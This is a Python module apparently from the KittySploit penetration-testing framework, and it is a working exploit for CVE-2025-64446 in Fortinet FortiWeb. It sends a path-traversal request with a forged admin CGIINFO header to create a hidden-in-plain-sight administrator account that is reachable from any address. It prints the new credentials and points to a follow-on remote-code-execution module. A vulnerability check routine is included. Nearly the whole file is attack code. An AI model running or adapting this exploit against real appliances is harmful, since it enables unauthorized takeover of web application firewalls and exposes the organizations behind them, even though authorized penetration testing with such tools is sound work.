#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiWeb auth bypass — create local admin account (CVE-2025-64446)."""

import base64
import json
import random
import string

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Fortinet FortiWeb Admin Account Creation (CVE-2025-64446)',
        'description': (
            'CVE-2025-64446 path traversal to cgi-bin/fwbcgi allows unauthenticated creation '
            'of a local FortiWeb administrator account (no shell session — chain to '
            'exploits/linux/http/fortinet_fortiweb_rce for RCE).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2025-64446'],
        'platform': Platform.UNIX,
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-64446',
            'https://www.fortiguard.com/psirt/FG-IR-25-910',
        ],
        'tags': ['fortinet', 'fortiweb', 'auth-bypass', 'admin', 'kev'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['active_exploitation', 'credential_access'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': True,
            'produces': ['exploit_paths', 'credentials'],
            'chain': {
                'suggested_followups': [
                    'scanner/http/cve_2025_64446_detect',
                    'exploits/linux/http/fortinet_fortiweb_rce',
                ],
            },
        },
    }

    path = OptString('/', 'Base URI path (prefix before /api/v2.0)', required=False)
    username = OptString('', 'Username for new admin user (random if empty)', required=False)
    password = OptString('', 'Password for new admin user (random if empty)', required=False)
    access_profile = OptString('prof_admin', 'Access profile for new user', required=False)

    def _generate_cgiinfo_header(self):
        cgi_data = {
            'username': 'admin',
            'profname': 'prof_admin',
            'vdom': 'root',
            'loginname': 'admin',
        }
        json_str = json.dumps(cgi_data, separators=(', ', ': '))
        return base64.b64encode(json_str.encode()).decode()

    def _generate_user_data(self):
        username = self.username or ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        password = self.password or ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        user_data = {
            'data': {
                'q_type': 1,
                'name': username,
                'access-profile': self.access_profile,
                'access-profile_val': '0',
                'trusthostv4': '0.0.0.0/0',
                'trusthostv6': '::/0',
                'last-name': '',
                'first-name': '',
                'email-address': '',
                'phone-number': '',
                'mobile-number': '',
                'hidden': 0,
                'comments': '',
                'sz_dashboard': -1,
                'type': 'local-user',
                'type_val': '0',
                'admin-usergrp_val': '0',
                'wildcard_val': '0',
                'accprofile-override_val': '0',
                'sshkey': '',
                'passwd-set-time': 0,
                'history-password-pos': 0,
                'history-password0': '',
                'history-password1': '',
                'history-password2': '',
                'history-password3': '',
                'history-password4': '',
                'history-password5': '',
                'history-password6': '',
                'history-password7': '',
                'history-password8': '',
                'history-password9': '',
                'force-password-change': 'disable',
                'force-password-change_val': '0',
                'password': password,
            }
        }
        return user_data, username, password

    def check(self):
        try:
            exploit_path = (
                f"{self.path.rstrip('/')}/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi"
            )
            headers = {
                'CGIINFO': self._generate_cgiinfo_header(),
                'Content-Type': 'application/json',
            }
            response = self.http_request(
                method='POST',
                path=exploit_path,
                headers=headers,
                data=json.dumps({'data': {}}),
                timeout=10,
            )
            if not response:
                return {'vulnerable': False, 'reason': 'No response', 'confidence': 'low'}
            if response.status_code == 403:
                return {'vulnerable': False, 'reason': 'HTTP 403 Forbidden', 'confidence': 'high'}
            if response.status_code != 200:
                return {
                    'vulnerable': False,
                    'reason': f'Unexpected HTTP {response.status_code}',
                    'confidence': 'medium',
                }
            body = response.json()
            if body.get('results', {}).get('message') == "Empty value isn't allowed.":
                return {
                    'vulnerable': True,
                    'reason': 'CVE-2025-64446 auth bypass confirmed',
                    'confidence': 'high',
                }
        except (json.JSONDecodeError, TypeError, AttributeError):
            pass
        except Exception as exc:
            return {'vulnerable': False, 'reason': f'Check failed: {exc}', 'confidence': 'low'}
        return {'vulnerable': False, 'reason': 'Unexpected fwbcgi probe response', 'confidence': 'medium'}

    def run(self):
        exploit_path = f"{self.path.rstrip('/')}/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi"
        print_warning('CVE-2025-64446: creates admin credentials only (use fortinet_fortiweb_rce for session)')

        user_data, username, password = self._generate_user_data()
        headers = {
            'CGIINFO': self._generate_cgiinfo_header(),
            'Content-Type': 'application/json',
        }
        response = self.http_request(
            method='POST',
            path=exploit_path,
            headers=headers,
            data=json.dumps(user_data),
            timeout=30,
        )
        if not response:
            print_error('No response received from server')
            return False
        if response.status_code != 200:
            print_error(f'HTTP {response.status_code}')
            return False
        try:
            response_json = response.json()
            results = response_json.get('results', {})
            if results.get('name') == username:
                print_success(f"Admin user '{username}' / '{password}' created")
                return True
            print_warning('HTTP 200 but user creation uncertain')
            print_info(json.dumps(response_json, indent=2))
            return True
        except json.JSONDecodeError:
            print_warning('Non-JSON HTTP 200 — verify manually')
            return True
